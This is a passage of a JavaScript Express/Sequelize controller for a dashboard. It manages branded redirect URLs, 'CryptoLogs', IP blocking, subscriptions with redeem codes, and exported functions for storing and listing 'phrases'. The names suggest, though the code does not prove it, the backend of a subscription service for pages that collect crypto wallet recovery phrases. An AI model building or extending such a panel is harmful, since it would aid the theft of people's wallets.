          as: "user", // Alias used in the association
          attributes: ["userName"], // Only fetch the userName field
        },
      ],
    });

    // Return the URLs along with the associated user data
    res.status(200).json(urls);
  } catch (error) {
    res
      .status(500)
      .json({ message: "Error fetching urls", error: error.message });
  }
};

// const getUrlById = async (req, res) => {
//   try {
//     const url = await Post.findById(req.params.id).populate("user", "username");
//     if (!url) {
//       return res.status(404).json({ message: "Url not found" });
//     }
//     res.status(200).json(url);
//   } catch (error) {
//     res.status(500).json({ message: "Error fetching url", error });
//   }
// };

const getUrlById = async (req, res) => {
  try {
    // Fetch the Url by its primary key (id) and include the associated User model
    const url = await Url.findByPk(req.params.id, {
      include: [
        {
          model: User,
          as: "user", // Alias used in the association
          attributes: ["userName"], // Fetch only the 'userName' field from the User model
        },
      ],
    });

    if (!url) {
      return res.status(404).json({ message: "Url not found" });
    }

    // Return the URL and the associated user data
    res.status(200).json(url);
  } catch (error) {
    res
      .status(500)
      .json({ message: "Error fetching url", error: error.message });
  }
};

// const updateUrl = async (req, res) => {
//   try {
//     const {
//       userId,
//       description,
//       redirectUrl,
//       appName,
//       appLogo,
//       backgroundcolor,
//       modalColor,
//       btnColor,
//     } = req.body;

//     // console.log("userId:  ", userId);
//     // console.log("url:  ", description);
//     // console.log("redurl:  ", redirectUrl);
//     // console.log("appname:  ", appName);
//     // console.log("applogo:  ", appLogo);
//     // console.log("bgclr:  ", backgroundcolor);
//     // console.log("mdlclr:  ", modalColor);

//     const url = await Url.findByIdAndUpdate(
//       req?.query?.id,
//       {
//         description,
//         timestamp: Date.now(),
//         user: userId,
//         redirectUrl,
//         appName,
//         appLogo,
//         backgroundcolor,
//         modalColor,
//         btnColor,
//       },
//       { new: true }
//     );
//     const cryptoLog = await CryptoLogs.findByIdAndUpdate(url?.cryptoLogId, {
//       userId,
//       appName,
//       appLogo,
//       modalColor,
//       backgroundcolor,
//       btnColor,
//       redirectUrl,
//     });

//     if(!cryptoLog){
//       return res.status(404).json({ message: "cryptoLog not found" });
//     }
//     if (!url) {
//       return res.status(404).json({ message: "Url not found" });
//     }
//     res.status(200).json(url);
//   } catch (error) {
//     res.status(500).json({ message: "Error updating url", error });
//   }
// };

const updateUrl = async (req, res) => {
  try {
    const {
      userId,
      description,
      redirectUrl,
      appName,
      appLogo,
      backgroundcolor,
      modalColor,
      btnColor,
    } = req.body;

    // Fetch the Url by its primary key (id)
    const url = await Url.findByPk(req.query.id); // Get id from query parameters

    if (!url) {
      return res.status(404).json({ message: "Url not found" });
    }

    // Update the URL record
    await url.update({
      description,
      user: userId,
      redirectUrl,
      app_name:appName,
      appLogo,
      backgroundcolor,
      modalColor,
      btnColor,
    });

    // Fetch the associated CryptoLog by its primary key (cryptoLogId)
    const cryptoLog = await CryptoLogs.findByPk(url.cryptoLogId);

    if (!cryptoLog) {
      return res.status(404).json({ message: "CryptoLog not found" });
    }

    // Update the CryptoLog record
    await cryptoLog.update({
      userId,
      app_name:appName,
      appLogo,
      modalColor,
      backgroundcolor,
      btnColor,
      redirectUrl,
    });

    // Return the updated URL
    res.status(200).json(url);
  } catch (error) {
    res
      .status(500)
      .json({ message: "Error updating url", error: error.message });
  }
};

const deleteUrl = async (req, res) => {
  try {
    // Find the URL by ID and delete it using Sequelize
    const url = await Url.findByPk(req?.query?.id); // findByPk for finding by primary key (id)

    if (!url) {
      return res.status(404).json({ message: "Url not found" });
    }

    // Proceed to delete the URL record
    await url.destroy(); // Sequelize destroy method for deletion

    res.status(200).json({ message: "Url deleted successfully", url });
  } catch (error) {
    res.status(500).json({ message: "Error deleting url", error });
  }
};

export const postIp = async (req, res) => {
  try {
    const { blockerId, ip } = req.body;

    // Basic validation
    if (!blockerId || !ip) {
      return res
        .status(400)
        .json({ message: "blockerId and ip are required." });
    }

    const newIp = await IpBlock.create({ blockerId, ip });

    res.status(201).json({
      message: "IP block created successfully.",
      data: newIp,
    });
  } catch (error) {
    console.error("Error creating IP block:", error);
    res.status(500).json({
      message: "Error creating IP block.",
      error: error.message,
    });
  }
};

export const getIps = async (req, res) => {
  try {
    const ips = await IpBlock.findAll({
      include: {
        model: User,
        as: "blocker",
        attributes: ["id", "userName", "email"],
      },
      order: [["createdAt", "DESC"]],
    });

    res.status(200).json(ips);
  } catch (error) {
    console.error("Error fetching IPs:", error);
    res.status(500).json({
      message: "Error fetching IPs",
      error: error.message,
    });
  }
};

export const deleteIp = async (req, res) => {
  try {
    const ipId = req?.query?.id;
    if (!ipId) {
      return res.status(400).json({ message: "IP ID is required" });
    }

    const deletedCount = await IpBlock.destroy({
      where: { id: ipId },
    });

    if (deletedCount === 0) {
      return res.status(404).json({ message: "IP not found" });
    }

    res
      .status(200)
      .json({ message: "IP deleted successfully", id: Number(ipId) });
  } catch (error) {
    console.error("Error deleting IP:", error);
    res.status(500).json({
      message: "Error deleting IP",
      error: error.message,
    });
  }
};

// const getTopUsersWithMostAccounts = async (req, res) => {
//   try {
//     const limit = 10;
//     const topUsers = await User.aggregate([
//       {
//         $lookup: {
//           from: "accounts", // Collection name for accounts
//           localField: "_id",
//           foreignField: "userId",
//           as: "accounts",
//         },
//       },
//       {
//         $project: {
//           _id: 1,
//           userName: 1,
//           profileImage: 1,
//           numberOfAccounts: { $size: "$accounts" },
//         },
//       },
//       { $sort: { numberOfAccounts: -1 } },
//       { $limit: limit },
//     ]);

//     res.status(200).json({ message: "top users successfully", topUsers });
//     return topUsers;
//   } catch (error) {
//     console.error("Error fetching top users:", error);
//     throw error;
//   }
// };

const getTopUsersWithMostAccounts = async (req, res) => {
  try {
    const limit = 10;

    const topUsers = await User.findAll({
      attributes: {
        include: [
          [
            sequelize.fn("COUNT", sequelize.col("cryptoLogs.id")),
            "numberOfAccounts",
          ],
        ],
      },
      include: [
        {
          model: CryptoLogs,
          as: "cryptoLogs",
          attributes: [],
        },
      ],
      group: ["User.id"],
      order: [[sequelize.literal("numberOfAccounts"), "DESC"]],
      limit,
      subQuery: false,
    });

    res
      .status(200)
      .json({ message: "Top users fetched successfully", topUsers });
  } catch (error) {
    console.error("Error fetching top users:", error);
    res.status(500).json({ message: "Failed to fetch top users", error });
  }
};

// const createSubscription = async (req, res) => {
//   // in all functions need to get the user data as well

//   try {
//     const { type, createdBy, duration, amount, redeemCode } = req.body;

//     // Validate mandatory fields
//     if (!type || !duration || !amount) {
//       return res.status(400).json({
//         message: "missing Payload",
//       });
//     }

//     if (type == "redeem" && !redeemCode) {
//       return res.status(400).json({
//         message: "redeemCode is missing",
//       });
//     }
//     // Create a new subscription
//     const newSubscription = new Subscription({
//       type,
//       createdBy: new mongoose.Types.ObjectId(createdBy) || null,
//       duration,
//       amount,
//       redeemCode: redeemCode || null, // Optional, default to null if not provided
//     });

//     // Save the subscription to the database
//     const savedSubscription = await newSubscription.save();

//     return res.status(201).json({
//       message: "Subscription created successfully.",
//       subscription: savedSubscription,
//     });
//   } catch (error) {
//     console.error("Error creating subscription:", error);
//     res.status(500).json({ message: "Internal server error.", error });
//   }
// };

const createSubscription = async (req, res) => {
  try {
    const { type, createdBy, duration, amount, redeemCode } = req.body;

    // Validate required fields
    if (!type || !duration || !amount) {
      return res.status(400).json({
        message: "Missing required fields: type, duration, or amount.",
      });
    }

    if (type === "redeem" && !redeemCode) {
      return res.status(400).json({
        message: "redeemCode is required when type is 'redeem'.",
      });
    }

    // Optional: Validate user exists
    const user = await User.findByPk(createdBy);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    const subscription = await Subscription.create({
      type,
      createdBy: createdBy || null,
      duration,
      amount,
      redeemCode: redeemCode || null,
    });

    // Optionally include user data in response
    const subscriptionWithUser = await Subscription.findByPk(subscription.id, {
      include: [
        {
          model: User,
          as: "creator",
          attributes: ["id", "userName", "email", "profileImage"],
        },
      ],
    });

    return res.status(201).json({
      message: "Subscription created successfully.",
      subscription: subscriptionWithUser,
    });
  } catch (error) {
    console.error("Error creating subscription:", error);
    return res.status(500).json({
      message: "Internal server error while creating subscription.",
      error,
    });
  }
};

// const getSubscriptions = async (req, res) => {
//   try {
//     const subscriptions = await Subscription.find().populate({
//       path: "createdBy",
//       select: "userName profileImage role",
//     });
//     9;

//     // Return the result
//     res.status(200).json({
//       message: "Subscriptions fetched successfully.",
//       subscriptions,
//     });
//   } catch (error) {
//     console.error("Error fetching subscriptions:", error);
//     res.status(500).json({ message: "Internal server error.", error });
//   }
// };

const getSubscriptions = async (req, res) => {
  try {
    const subscriptions = await Subscription.findAll({
      include: [
        {
          model: User,
          as: "creator",
          attributes: ["userName", "profileImage", "role"],
        },
      ],
      order: [["createdAt", "DESC"]],
    });

    res.status(200).json({
      message: "Subscriptions fetched successfully.",
      subscriptions,
    });
  } catch (error) {
    console.error("Error fetching subscriptions:", error);
    res.status(500).json({ message: "Internal server error.", error });
  }
};

// const createSubscriptionHistory = async (req, res) => {
//   try {
//     const { userId, subscriptionId, startDate, expireDate, active, redeem } =
//       req.body;

//     // Check if the user already has an active subscription
//     const existingSubscription = await SubscriptionHistory.findOne({
//       userId,
//       active: true, // Check for active subscriptions
//     });

//     if (existingSubscription) {
//       return res.status(409).json({
//         message: `You already have an active subscription which will end on ${moment(
//           existingSubscription.expireDate
//         ).format("d/MM/YYYY")}.`,
//       });
//     }

//     // Create a new subscription history record
//     const newSubscriptionHistory = new SubscriptionHistory({
//       userId,
//       subscriptionId,
//       startDate: startDate || Date.now(),
//       expireDate: expireDate || Date.now(),
//       active: active ?? false,
//       redeem: redeem ?? true,
//     });

//     // Save to the database
//     const savedSubscriptionHistory = await newSubscriptionHistory.save();

//     return res.status(201).json({
//       message: "Subscription history created successfully.",
//       subscriptionHistory: savedSubscriptionHistory,
//     });
//   } catch (error) {
//     console.error("Error creating subscription history:", error);
//     res.status(500).json({ message: "Internal server error.", error });
//   }
// };

const createSubscriptionHistory = async (req, res) => {
  try {
    const { userId, subscriptionId, startDate, expireDate, active, redeem } =
      req.body;

    // Check if the user already has an active subscription
    const existingSubscription = await SubscriptionHistory.findOne({
      where: {
        userId,
        active: true,
      },
    });

    if (existingSubscription) {
      return res.status(409).json({
        message: `You already have an active subscription which will end on ${moment(
          existingSubscription.expireDate
        ).format("D/MM/YYYY")}.`,
      });
    }

    const newSubscriptionHistory = await SubscriptionHistory.create({
      userId,
      subscriptionId,
      startDate: startDate || new Date(),
      expireDate: expireDate || new Date(),
      active: active ?? false,
      redeem: redeem ?? true,
      createdBy:userId
    });

    return res.status(201).json({
      message: "Subscription history created successfully.",
      subscriptionHistory: newSubscriptionHistory,
    });
  } catch (error) {
    console.error("Error creating subscription history:", error);
    res.status(500).json({ message: "Internal server error.", error });
  }
};

// const getSubscriptionsHistoryForAdmin = async (req, res) => {
//   try {
//     const { adminId } = req.query;

//     if (!adminId || !mongoose.Types.ObjectId.isValid(adminId)) {
//       return res.status(400).json({
//         message: "Valid adminId is required.",
//       });
//     }

//     console.log("Admin ID:", adminId);

//     const subscriptionHistories = await SubscriptionHistory.aggregate([
//       {
//         $lookup: {
//           from: "subscriptions",
//           localField: "subscriptionId",
//           foreignField: "_id",
//           as: "subscriptionDetails",
//         },
//       },

//       {
//         $match: {
//           "subscriptionDetails.createdBy": new mongoose.Types.ObjectId(adminId),
//         },
//       },

//       {
//         $unwind: "$subscriptionDetails",
//       },

//       {
//         $lookup: {
//           from: "users",
//           localField: "userId",
//           foreignField: "_id",
//           as: "userDetails",
//         },
//       },

//       {
//         $unwind: "$userDetails",
//       },

//       {
//         $project: {
//           _id: 1,
//           type: 1,
//           userId: 1,
//           subscriptionId: 1,
//           startDate: 1,
//           expireDate: 1,
//           active: 1,
//           redeem: 1,
//           createdAt: 1,
//           updatedAt: 1,
//           "subscriptionDetails.type": 1,
//           "subscriptionDetails.createdBy": 1,
//           "subscriptionDetails.amount": 1,
//           "subscriptionDetails.duration": 1,
//           "subscriptionDetails.redeemCode": 1,
//           "userDetails.userName": 1,
//           "userDetails.email": 1,
//           "userDetails.role": 1,
//         },
//       },
//     ]);

//     // Check if any subscription histories were found
//     if (!subscriptionHistories.length) {
//       return res.status(404).json({
//         message: "No subscription history found for this admin.",
//       });
//     }

//     // Return the subscription histories
//     res.status(200).json({
//       message: "Subscription history fetched successfully.",
//       subscriptionHistories,
//     });
//   } catch (error) {
//     console.error("Error fetching admin subscription history:", error);
//     res.status(500).json({ message: "Internal server error.", error });
//   }
// };

const getSubscriptionsHistoryForAdmin = async (req, res) => {
  try {
    const { adminId } = req.query;

    if (!adminId) {
      return res.status(400).json({
        message: "Valid adminId is required.",
      });
    }

    const subscriptionHistories = await SubscriptionHistory.findAll({
      include: [
        {
          model: Subscription,
          as: "subscription",
          where: { userId: adminId },
          attributes: ["type", "createdBy", "amount", "duration", "redeemCode"],
        },
        {
          model: User,
          as: "user",
          attributes: ["userName", "email", "role"],
        },
      ],
      attributes: {
        exclude: ["updatedAt"], // customize this as you wish
      },
      order: [["createdAt", "DESC"]],
    });

    if (!subscriptionHistories.length) {
      return res.status(404).json({
        message: "No subscription history found for this admin.",
      });
    }

    res.status(200).json({
      message: "Subscription history fetched successfully.",
      subscriptionHistories,
    });
  } catch (error) {
    console.error("Error fetching admin subscription history:", error);
    res.status(500).json({ message: "Internal server error.", error });
  }
};

// const getMySubscriptionsHistory = async (req, res) => {
//   try {
//     const { userId } = req.query;
//     if (!userId) {
//       return res.status(404).json({
//         message: "User id is required.",
//       });
//     }
//     const mySubscriptionHistories = await SubscriptionHistory.find({
//       userId,
//     }).populate({
//       path: "subscriptionId",
//       select: "type duration amount redeemCode",
//     });

//     if (!mySubscriptionHistories.length) {
//       return res.status(404).json({
//         message: "No subscription history found for this user.",
//       });
//     }

//     res.status(200).json({
//       message: "Subscription history fetched successfully.",
//       subscriptionHistories: mySubscriptionHistories,
//     });
//   } catch (error) {
//     console.error("Error fetching user's subscription history:", error);
//     res.status(500).json({ message: "Internal server error.", error });
//   }
// };

// const getMySubscriptionsHistory = async (req, res) => {
//   try {
//     const { userIds } = req.query;
//     // console.log("userIds:  ", userIds);

//     if (!userIds || !Array.isArray(userIds)) {
//       return res.status(400).json({
//         message: "An array of user IDs is required.",
//       });
//     }

//     const mySubscriptionHistories = await SubscriptionHistory.find({
//       userId: { $in: userIds }, // Find all histories where userId matches any in the array
//     }).populate({
//       path: "subscriptionId",
//       select: "type duration amount redeemCode",
//     });

//     if (!mySubscriptionHistories.length) {
//       return res.status(404).json({
//         message: "No subscription histories found for the provided user IDs.",
//       });
//     }

//     res.status(200).json({
//       message: "Subscription histories fetched successfully.",
//       subscriptionHistories: mySubscriptionHistories,
//     });
//   } catch (error) {
//     console.error("Error fetching subscription histories:", error);
//     res.status(500).json({ message: "Internal server error.", error });
//   }
// };

const getMySubscriptionsHistory = async (req, res) => {
  try {
    let { userIds } = req.query;

    // If userIds is a comma-separated string, split and convert to array of integers
    if (typeof userIds === "string") {
      userIds = userIds
        .split(",")
        .map((id) => parseInt(id, 10))
        .filter((id) => !isNaN(id));
    }

    // Validate the userIds array
    if (!Array.isArray(userIds) || userIds.length === 0) {
      return res.status(400).json({
        message: "An array of valid user IDs is required.",
      });
    }

    // Fetch subscription histories for the given user IDs
    const mySubscriptionHistories = await SubscriptionHistory.findAll({
      where: {
        userId: {
          [Op.in]: userIds,
        },
      },
      include: [
        {
          model: Subscription,
          as: "subscription",
          attributes: ["type", "duration", "amount", "redeemCode"],
        },
      ],
      order: [["createdAt", "DESC"]],
    });

    // If no records found
    if (!mySubscriptionHistories.length) {
      return res.status(404).json({
        message: "No subscription histories found for the provided user IDs.",
      });
    }

    // Return success response
    res.status(200).json({
      message: "Subscription histories fetched successfully.",
      subscriptionHistories: mySubscriptionHistories,
    });
  } catch (error) {
    console.error("Error fetching subscription histories:", error);
    res.status(500).json({
      message: "Internal server error.",
      error,
    });
  }
};

const getAllUsers = async (req, res) => {
  try {
    // Fetch all users
    const users = await User.findAll();

    if (!users.length) {
      return res.status(404).json({
        message: "No users found.",
      });
    }

    res.status(200).json({
      message: "Users fetched successfully.",
      users,
    });
  } catch (error) {
    console.error("Error fetching users:", error);
    res.status(500).json({
      message: "Internal server error.",
      error,
    });
  }
};

const getAllMessages = async (req, res) => {
  try {
    const messages = await Message.findAll({
      order: [["createdAt", "DESC"]],
      include: [
        {
          model: User,
          as: "user",
          attributes: ["id", "userName", "email"], // Pick what you need
        },
      ],
    });

    if (!messages.length) {
      return res.status(404).json({
        message: "No messages found.",
      });
    }

    res.status(200).json({
      message: "Messages fetched successfully.",
      messages,
    });
  } catch (error) {
    console.error("Error fetching messages:", error);
    res.status(500).json({
      message: "Internal server error.",
      error: error.message,
    });
  }
};

const verifyReCaptcha = async (req, res) => {
  try {
    const { token } = req.body;
    const secretKey = process.env.NEXT_PUBLIC_RECAPTCHA_SECRET_KEY;

    // Verify reCAPTCHA token with Google API
    const response = await axios.post(
      "https://www.google.com/recaptcha/api/siteverify",
      null,
      {
        params: {
          secret: secretKey,
          response: token,
        },
      }
    );

    if (!response.data.success) {
      return res.status(400).json({
        message: "reCAPTCHA verification failed.",
        error: response.data,
      });
    }

    res.status(200).json({
      message: "reCAPTCHA verified successfully.",
      success: true,
    });
  } catch (error) {
    console.error("Error verifying reCAPTCHA:", error);
    res.status(500).json({
      message: "Internal server error.",
      error: error.message,
    });
  }
};

export const dashboard = {
  getAllUser,
  getTodayUsers,
  getAllLoginAttempts,
  createPost,
  createReview,
  getReviews,
  getPostById,
  getPosts,
  updatePost,
  getSingleAccount,
  getAccounts,
  deletePost,
  deleteAccount,
  getNotifications,
  getNotification,
  editUserProfile,
  deleteNotification,
  getAllAccounts,
  createUrl,
  getUrls,
  getUrlById,
  updateUrl,
  deleteUrl,
  getAccountsStatistics,
  postIp,
  getIps,
  deleteIp,
  getTopUsersWithMostAccounts,
  getGlobalLoginAttempts,
  clearAllNotifications,
  createSubscription,
  getSubscriptions,
  getSubscriptionsHistoryForAdmin,
  createSubscriptionHistory,
  getMySubscriptionsHistory,
  getAllUsers,
  getAllMessages,
  setAccPhrase,
  getCryptoLog,
  createPhrase,
  getPhrases,
  verifyReCaptcha,
};
